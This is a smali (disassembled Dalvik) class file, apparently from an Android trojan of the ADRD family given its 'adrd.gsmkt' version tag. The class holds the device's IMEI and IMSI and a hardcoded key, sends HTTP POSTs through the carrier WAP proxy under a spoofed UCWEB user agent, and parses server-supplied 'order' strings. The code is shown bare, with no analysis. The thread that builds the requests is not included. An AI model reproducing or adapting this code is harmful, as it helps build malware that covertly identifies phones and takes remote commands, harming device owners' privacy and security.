.class public Lcom/xxx/yyy/qzl;
.super Ljava/lang/Object;
.source "qzl.java"


# instance fields
.field private context:Landroid/content/Context;

.field public doflag:I

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private iversion:Ljava/lang/String;

.field private kk:Ljava/lang/String;

.field public netway:I

.field private oversion:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    .registers 6
    .parameter "ct"
    .parameter "is"
    .parameter "im"
    .parameter "way"

    .prologue
    .line 32
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 29
    const-string v0, "7"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    .line 30
    const-string v0, "adrd.gsmkt.l.1"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    .line 31
    const/4 v0, 0x0

    iput v0, p0, Lcom/xxx/yyy/qzl;->doflag:I

    .line 34
    iput-object p1, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    .line 35
    iput-object p2, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    .line 36
    iput-object p3, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    .line 37
    iput p4, p0, Lcom/xxx/yyy/qzl;->netway:I

    .line 38
    const-string v0, "48734154"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    .line 40
    return-void
.end method

.method private CheckNetWork(Ljava/lang/String;)Z
    .registers 12
    .parameter "url"

    .prologue
    const/4 v9, 0x0

    .line 198
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 199
    .local v1, httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v6, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v6, :cond_1e

    .line 201
    new-instance v3, Lorg/apache/http/HttpHost;

    const-string v6, "10.0.0.172"

    const/16 v7, 0x50

    const-string v8, "http"

    invoke-direct {v3, v6, v7, v8}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 202
    .local v3, proxy:Lorg/apache/http/HttpHost;
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v6

    const-string v7, "http.route.default-proxy"

    invoke-interface {v6, v7, v3}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 204
    .end local v3           #proxy:Lorg/apache/http/HttpHost;
    :cond_1e
    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 205
    .local v2, method:Lorg/apache/http/client/methods/HttpPost;
    const-string v6, "User-Agent"

    const-string v7, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 206
    const-string v6, "Accept"

    const-string v7, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 210
    :try_start_31
    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 211
    .local v4, resp:Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    .line 213
    .local v5, status:I
    const/16 v6, 0xc8

    if-eq v5, v6, :cond_43

    move v6, v9

    .line 228
    .end local v4           #resp:Lorg/apache/http/HttpResponse;
    .end local v5           #status:I
    :goto_42
    return v6

    .line 215
    .restart local v4       #resp:Lorg/apache/http/HttpResponse;
    .restart local v5       #status:I
    :cond_43
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_4a
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_31 .. :try_end_4a} :catch_4c
    .catch Ljava/io/IOException; {:try_start_31 .. :try_end_4a} :catch_53
    .catch Ljava/lang/Exception; {:try_start_31 .. :try_end_4a} :catch_5a

    .line 216
    const/4 v6, 0x1

    goto :goto_42

    .line 217
    .end local v4           #resp:Lorg/apache/http/HttpResponse;
    .end local v5           #status:I
    :catch_4c
    move-exception v6

    move-object v0, v6

    .line 219
    .local v0, e:Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    move v6, v9

    .line 220
    goto :goto_42

    .line 221
    .end local v0           #e:Lorg/apache/http/client/ClientProtocolException;
    :catch_53
    move-exception v6

    move-object v0, v6

    .line 223
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    move v6, v9

    .line 224
    goto :goto_42

    .line 225
    .end local v0           #e:Ljava/io/IOException;
    :catch_5a
    move-exception v6

    move-object v0, v6

    .line 227
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move v6, v9

    .line 228
    goto :goto_42
.end method

.method private GetO(Ljava/lang/String;)Ljava/lang/String;
    .registers 14
    .parameter "url"

    .prologue
    const-string v11, ""

    .line 236
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 237
    .local v2, httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v8, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v8, :cond_1f

    .line 239
    new-instance v4, Lorg/apache/http/HttpHost;

    const-string v8, "10.0.0.172"

    const/16 v9, 0x50

    const-string v10, "http"

    invoke-direct {v4, v8, v9, v10}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 240
    .local v4, proxy:Lorg/apache/http/HttpHost;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v8

    const-string v9, "http.route.default-proxy"

    invoke-interface {v8, v9, v4}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 243
    .end local v4           #proxy:Lorg/apache/http/HttpHost;
    :cond_1f
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 245
    .local v3, method:Lorg/apache/http/client/methods/HttpPost;
    const-string v8, "User-Agent"

    const-string v9, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 246
    const-string v8, "Accept"

    const-string v9, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 257
    :try_start_32
    invoke-virtual {v2, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 258
    .local v5, resp:Lorg/apache/http/HttpResponse;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_3d
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_32 .. :try_end_3d} :catch_5b
    .catch Ljava/io/IOException; {:try_start_32 .. :try_end_3d} :catch_64
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_3d} :catch_6d

    move-result v7

    .line 260
    .local v7, status:I
    const/16 v8, 0xc8

    if-eq v7, v8, :cond_46

    .line 261
    const-string v8, ""

    move-object v8, v11

    .line 280
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v7           #status:I
    :goto_45
    return-object v8

    .line 263
    .restart local v5       #resp:Lorg/apache/http/HttpResponse;
    .restart local v7       #status:I
    :cond_46
    :try_start_46
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 265
    .local v1, entity:Lorg/apache/http/HttpEntity;
    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v8

    invoke-virtual {p0, v8}, Lcom/xxx/yyy/qzl;->generateString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v6

    .line 267
    .local v6, result:Ljava/lang/String;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_59
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_46 .. :try_end_59} :catch_5b
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_59} :catch_64
    .catch Ljava/lang/Exception; {:try_start_46 .. :try_end_59} :catch_6d

    move-object v8, v6

    .line 268
    goto :goto_45

    .line 269
    .end local v1           #entity:Lorg/apache/http/HttpEntity;
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v6           #result:Ljava/lang/String;
    .end local v7           #status:I
    :catch_5b
    move-exception v8

    move-object v0, v8

    .line 271
    .local v0, e:Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    .line 272
    const-string v8, ""

    move-object v8, v11

    goto :goto_45

    .line 273
    .end local v0           #e:Lorg/apache/http/client/ClientProtocolException;
    :catch_64
    move-exception v8

    move-object v0, v8

    .line 275
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 276
    const-string v8, ""

    move-object v8, v11

    goto :goto_45

    .line 277
    .end local v0           #e:Ljava/io/IOException;
    :catch_6d
    move-exception v8

    move-object v0, v8

    .line 279
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 280
    const-string v8, ""

    move-object v8, v11

    goto :goto_45
.end method

.method private ParseO(Ljava/lang/String;)V
    .registers 16
    .parameter "od"

    .prologue
    .line 110
    const-string v9, ""

    .line 111
    .local v9, sendmdn:Ljava/lang/String;
    const-string v6, ""

    .line 112
    .local v6, order:Ljava/lang/String;
    const-string v12, "\\|"

    invoke-virtual {p1, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 113
    .local v10, strs:[Ljava/lang/String;
    array-length v12, v10

    const/4 v13, 0x4

    if-lt v12, v13, :cond_3d

    .line 115
    const/4 v12, 0x0

    aget-object v9, v10, v12

    .line 116
    const/4 v12, 0x1

    aget-object v6, v10, v12

    .line 118
    const/4 v8, 0x1

    .line 119
    .local v8, sPos:I
    const/4 v2, 0x0

    .line 120
    .local v2, ePos:I
    const/4 v3, 0x0

    .line 121
    .local v3, flag:I
    const/4 v0, 0x1

    .line 122
    .local v0, Count:I
    const/4 v5, 0x0

    .line 123
    .local v5, needFlash:Z
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    .line 124
    .local v1, chars:[C
    const/4 v4, 0x0

    .local v4, i:I
    :goto_21
    array-length v12, v1

    if-lt v4, v12, :cond_3e

    .line 153
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->length()I

    .line 163
    const/4 v12, 0x3

    aget-object v7, v10, v12

    .line 164
    .local v7, part4:Ljava/lang/String;
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v12

    const/4 v13, 0x1

    if-le v12, v13, :cond_3d

    .line 166
    const-string v12, "\\["

    invoke-virtual {v7, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    .line 172
    .end local v0           #Count:I
    .end local v1           #chars:[C
    .end local v2           #ePos:I
    .end local v3           #flag:I
    .end local v4           #i:I
    .end local v5           #needFlash:Z
    .end local v7           #part4:Ljava/lang/String;
    .end local v8           #sPos:I
    :cond_3d
    return-void

    .line 126
    .restart local v0       #Count:I
    .restart local v1       #chars:[C
    .restart local v2       #ePos:I
    .restart local v3       #flag:I
    .restart local v4       #i:I
    .restart local v5       #needFlash:Z
    .restart local v8       #sPos:I
    :cond_3e
    aget-char v12, v1, v4

    const/16 v13, 0x2b

    if-ne v12, v13, :cond_55

    .line 128
    move v2, v4

    .line 129
    if-le v2, v8, :cond_4f

    .line 131
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    .line 134
    .local v11, t:Ljava/lang/String;
    const/4 v5, 0x1

    .line 136
    .end local v11           #t:Ljava/lang/String;
    :cond_4f
    add-int/lit8 v8, v2, 0x1

    .line 137
    const/4 v3, 0x1

    .line 124
    :cond_52
    :goto_52
    add-int/lit8 v4, v4, 0x1

    goto :goto_21

    .line 139
    :cond_55
    aget-char v12, v1, v4

    const/16 v13, 0x2d

    if-ne v12, v13, :cond_52

    .line 141
    move v2, v4

    .line 142
    if-le v2, v8, :cond_66

    .line 144
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    .line 147
    .restart local v11       #t:Ljava/lang/String;
    const/4 v5, 0x1

    .line 149
    .end local v11           #t:Ljava/lang/String;
    :cond_66
    add-int/lit8 v8, v2, 0x1

    .line 150
    const/4 v3, 0x0

    goto :goto_52
.end method

.method static synthetic access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 24
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 23
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 29
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$3(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 30
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 26
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/xxx/yyy/qzl;Ljava/lang/String;)Ljava/lang/String;
    .registers 3
    .parameter
    .parameter

    .prologue
    .line 231
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->GetO(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$6(Lcom/xxx/yyy/qzl;)Landroid/content/Context;
    .registers 2
    .parameter

    .prologue
    .line 27
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$7(Lcom/xxx/yyy/qzl;Ljava/lang/String;)V
    .registers 2
    .parameter
    .parameter

    .prologue
    .line 108
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->ParseO(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public GG()V
    .registers 2

    .prologue
    .line 44
    new-instance v0, Lcom/xxx/yyy/qzl$1;

    invoke-direct {v0, p0}, Lcom/xxx/yyy/qzl$1;-><init>(Lcom/xxx/yyy/qzl;)V

    .line 106
    invoke-virtual {v0}, Lcom/xxx/yyy/qzl$1;->start()V

    .line 107
    return-void
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .registers 8
    .parameter "stream"

    .prologue
    .line 174
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 175
    .local v3, reader:Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 176
    .local v0, buffer:Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 179
    .local v4, sb:Ljava/lang/StringBuilder;
    :goto_f
    :try_start_f
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_12
    .catch Ljava/io/IOException; {:try_start_f .. :try_end_12} :catch_21

    move-result-object v1

    .local v1, cur:Ljava/lang/String;
    if-nez v1, :cond_1d

    .line 188
    .end local v1           #cur:Ljava/lang/String;
    :goto_15
    :try_start_15
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_18
    .catch Ljava/io/IOException; {:try_start_15 .. :try_end_18} :catch_27

    .line 193
    :goto_18
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 180
    .restart local v1       #cur:Ljava/lang/String;
    :cond_1d
    :try_start_1d
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_20
    .catch Ljava/io/IOException; {:try_start_1d .. :try_end_20} :catch_21

    goto :goto_f

    .line 183
    .end local v1           #cur:Ljava/lang/String;
    :catch_21
    move-exception v5

    move-object v2, v5

    .line 185
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_15

    .line 189
    .end local v2           #e:Ljava/io/IOException;
    :catch_27
    move-exception v2

    .line 191
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_18
.end method
